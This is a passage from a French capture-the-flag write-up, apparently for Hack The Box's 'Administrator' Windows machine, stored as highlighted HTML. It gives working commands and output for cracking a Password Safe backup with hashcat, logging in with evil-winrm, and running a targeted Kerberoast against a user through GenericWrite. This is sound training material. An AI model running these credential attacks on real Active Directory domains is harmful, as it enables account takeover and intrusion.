+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="mi">5200&lt;/span> &lt;span class="nx">Backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span>&lt;span class="p">:&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Session&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nx">hashcat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Status&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="nx">Cracked&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Hash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Mode&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="mi">5200&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Password&lt;/span> &lt;span class="nx">Safe&lt;/span> &lt;span class="nx">v3&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Hash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Target&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Started&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">43&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">sec&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Estimated&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">44&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="nx">secs&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Kernel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Feature&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Pure&lt;/span> &lt;span class="nx">Kernel&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Guess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Base&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nf">File&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Guess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Queue&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">100.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Speed&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="mi">23899&lt;/span> &lt;span class="nx">H&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nf">s&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">6.93&lt;/span>&lt;span class="nx">ms&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="err">@&lt;/span> &lt;span class="nx">Accel&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">256&lt;/span> &lt;span class="nx">Loops&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1024&lt;/span> &lt;span class="nx">Thr&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">Vec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">Recovered&lt;/span>&lt;span class="o">......&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">100.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Digests&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">total&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">100.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Digests&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">new&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Progress&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5120&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">14344385&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.04&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Rejected&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">5120&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.00&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Restore&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Point&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="mi">4608&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">14344385&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mf">0.03&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Restore&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Sub&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="nx">Salt&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="nx">Amplifier&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">Iteration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2048&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2049&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Candidate&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nx">Device&lt;/span> &lt;span class="nx">Generator&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Candidates&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Liverpool&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">babygrl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Hardware&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Mon&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">#&lt;/span>&lt;span class="mf">1.&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nx">Util&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">60&lt;/span>&lt;span class="o">%&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Started&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">42&lt;/span> &lt;span class="mi">2025&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Stopped&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Sat&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">19&lt;/span> &lt;span class="mi">20&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">45&lt;/span> &lt;span class="mi">2025&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>On utilise ce mot de passe pour ouvrir le fichier avec &lt;code>pwsafe&lt;/code> et on récupère le mot de passe d&amp;rsquo;Emily.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">pwsafe&lt;/span> &lt;span class="nx">Backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/pwsafe.PNG"
+width="378"
+height="248"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/pwsafe_hu_535d0090073b2514.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/pwsafe_hu_13e1a995219ba5b6.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="152"
+data-flex-basis="365px"
+>&lt;/p>
+&lt;p>On constate dans BH qu&amp;rsquo;Emily peut accéder à la machine, on s&amp;rsquo;y connecte avec &lt;code>evil-winrm&lt;/code> pour récupérer le &lt;code>user.txt&lt;/code>.&lt;br>
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PSRemoteEmily.PNG"
+width="474"
+height="158"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PSRemoteEmily_hu_64d05379de6882f9.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PSRemoteEmily_hu_cf2b115231ed43a0.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="300"
+data-flex-basis="720px"
+>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">8
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">winrm&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="mf">10.10.11.42&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">emily&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">U&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">b&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>&lt;span class="nx">Evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">WinRM&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">PS&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">emily&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Documents&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">cd&lt;/span> &lt;span class="p">..&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Desktop&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>&lt;span class="nx">Evil&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">WinRM&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nx">PS&lt;/span> &lt;span class="nx">C&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Users&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">emily&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">Desktop&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">dir&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Mode&lt;/span> &lt;span class="nx">LastWriteTime&lt;/span> &lt;span class="nx">Length&lt;/span> &lt;span class="nx">Name&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">----&lt;/span> &lt;span class="o">-------------&lt;/span> &lt;span class="o">------&lt;/span> &lt;span class="o">----&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">----&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2024&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">23&lt;/span> &lt;span class="nx">PM&lt;/span> &lt;span class="mi">2308&lt;/span> &lt;span class="nx">Microsoft&lt;/span> &lt;span class="nx">Edge&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">lnk&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">ar&lt;/span>&lt;span class="o">---&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">02&lt;/span> &lt;span class="nx">PM&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/pwsafe.PNG"
+width="378"
+height="248"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/pwsafe_hu_535d0090073b2514.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/pwsafe_hu_13e1a995219ba5b6.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="152"
+data-flex-basis="365px"
+>&lt;/p>
+&lt;h2 id="root">Root
+&lt;/h2>&lt;h3 id="genericwrite-emily---ethan">GenericWrite, Emily -&amp;gt; Ethan
+&lt;/h3>&lt;p>Comme vu précédemment, Emily a les privilèges &lt;code>GenericWrite&lt;/code> sur le compte d&amp;rsquo;Ethan et Ethan peut DCsync.&lt;br>
+On va d&amp;rsquo;abord récupérer le hash d&amp;rsquo;Ethan et le cracker avec hashcat.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/EmilytoEthan.PNG"
+width="724"
+height="117"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/EmilytoEthan_hu_553b11c9d966cb85.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/EmilytoEthan_hu_cddd5ef5231b99fa.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="618"
+data-flex-basis="1485px"
+>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 6
+&lt;/span>&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
+&lt;/span>&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">23
+&lt;/span>&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">targetedKerberoast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">emily&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Starting&lt;/span> &lt;span class="nx">kerberoast&lt;/span> &lt;span class="nx">attacks&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Fetching&lt;/span> &lt;span class="nx">usernames&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">Active&lt;/span> &lt;span class="nx">Directory&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">LDAP&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">VERBOSE&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">SPN&lt;/span> &lt;span class="nx">added&lt;/span> &lt;span class="nx">successfully&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Printing&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span>&lt;span class="nx">krb5tgs&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">ADMINISTRATOR&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">7&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">VERBOSE&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">SPN&lt;/span> &lt;span class="nx">removed&lt;/span> &lt;span class="nx">successfully&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">hashcat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">a&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="mi">13100&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wordlists&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">$&lt;/span>&lt;span class="nx">krb5tgs&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">ADMINISTRATOR&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ethan&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">t&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Session&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">.:&lt;/span> &lt;span class="nx">hashcat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Status&lt;/span>&lt;span class="o">.........&lt;/span>&lt;span class="p">..:&lt;/span> &lt;span class="nx">Cracked&lt;/span>
